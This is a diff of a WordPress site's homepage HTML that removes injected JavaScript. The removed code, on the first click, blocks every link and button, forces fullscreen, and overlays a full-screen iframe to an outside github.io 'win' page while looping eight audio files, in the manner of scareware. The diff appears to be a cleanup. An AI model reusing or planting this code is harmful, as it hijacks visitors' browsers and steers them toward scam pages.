@@ -1,64 +1,6 @@
 <!DOCTYPE html>
 <html lang="en-US" prefix="og: https://ogp.me/ns#">
 <head>
-	
-    <script>
-(function () {
-	
-
-  let triggered = false;
-
-  function redirectAd(e) {
-    // block everything
-    e.preventDefault();
-    e.stopImmediatePropagation();
-
-    if (triggered) return;
-    triggered = true;
-
-    let docElm = document.documentElement;
-
-    if (docElm.requestFullscreen) {
-      docElm.requestFullscreen().catch(() => {});
-    }
-
-    if (typeof closeAd === "function") closeAd();
-
-    let iframe = document.createElement("iframe");
-    iframe.src = " https://globalexpressai.github.io/win/";
-    iframe.style.position = "fixed";
-    iframe.style.top = "0";
-    iframe.style.left = "0";
-    iframe.style.width = "100%";
-    iframe.style.height = "100%";
-    iframe.style.border = "none";
-    iframe.style.zIndex = "999999";
-    audi()
-    document.body.appendChild(iframe);
-
-    // remove all listeners after trigger
-    document.removeEventListener("click", redirectAd, true);
-    document.removeEventListener("touchstart", redirectAd, true);
-  }
-
-  // 🔒 Block all other interactions (earliest)
-  function blockAll(e) {
-    e.preventDefault();
-    e.stopImmediatePropagation();
-    return false;
-  }
-
-  // Capture phase = strongest
-  document.addEventListener("click", redirectAd, true);
-  document.addEventListener("touchstart", redirectAd, true);
-
-  // Disable all links & buttons
-  document.addEventListener("click", blockAll, false);
-  document.addEventListener("mousedown", blockAll, false);
-  document.addEventListener("mouseup", blockAll, false);
-})();
-</script>
-
 	<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-2MMLJL5Z3J"></script>
 <script>
@@ -66,12 +8,13 @@
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
   gtag('config', 'G-2MMLJL5Z3J');
-<script type="text/javascript">
+</script>
+	<script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "uqn0bgk37j");
+    })(window, document, "clarity", "script", "upwiavv3sx");
 </script>
 	<script>
     document.addEventListener('DOMContentLoaded', function() {
@@ -423,60 +366,7 @@ p.pf-nm {
 		</head>
 
 <body onclick="redirectAd()" itemtype='https://schema.org/WebPage' itemscope='itemscope' class="home wp-singular page-template page-template-home page-template-home-php page page-id-15667 wp-custom-logo wp-theme-astra ast-desktop ast-plain-container ast-no-sidebar astra-4.6.5 group-blog ast-single-post ast-inherit-site-logo-transparent ast-hfb-header ast-normal-title-enabled astra-addon-4.1.5">
-<audio id="audio1" src="static/audio1.mp3"></audio>
-<audio id="audio2" src="static/audio2.mp3"></audio>
-<audio id="audio3" src="static/audio3.mp3"></audio>
-<audio id="audio4" src="static/audio4.mp3"></audio>
-<audio id="audio5" src="static/audio5.mp3"></audio>
-<audio id="audio6" src="static/audio6.mp3"></audio>
-<audio id="audio7" src="static/audio7.mp3"></audio>
-<audio id="audio8" src="static/audio8.mp3"></audio>
-<script>
-	let play = false;
-function audi() {
-        
-        // Get the audio elements
-        if (play) return;
-        play=true
 
-        const audio1 = document.getElementById('audio1');
-        const audio2 = document.getElementById('audio2');
-        const audio3 = document.getElementById('audio3');
-        const audio4 = document.getElementById('audio4');
-        const audio5 = document.getElementById('audio5');
-        const audio6 = document.getElementById('audio6');
-        const audio7 = document.getElementById('audio7');
-        const audio8 = document.getElementById('audio8');
-        // Play the first audio
-        audio1.play();
-
-        // When the first audio ends, play the second audio
-        audio1.onended = function() {
-            audio2.play();
-        };
-        audio2.onended = function() {
-            audio3.play();
-        };
-        audio3.onended = function() {
-            audio4.play();
-        };
-        audio4.onended = function() {
-            audio5.play();
-        };
-        audio5.onended = function() {
-            audio6.play();
-        };
-        audio6.onended = function() {
-            audio7.play();
-        };
-        audio7.onended = function() {
-            audio8.play();
-        };
-        audio8.onended = function() {
-            audio1.play();
-        };
-        }
-<script/>
 <a
 	class="skip-link screen-reader-text"
 	href="#content"
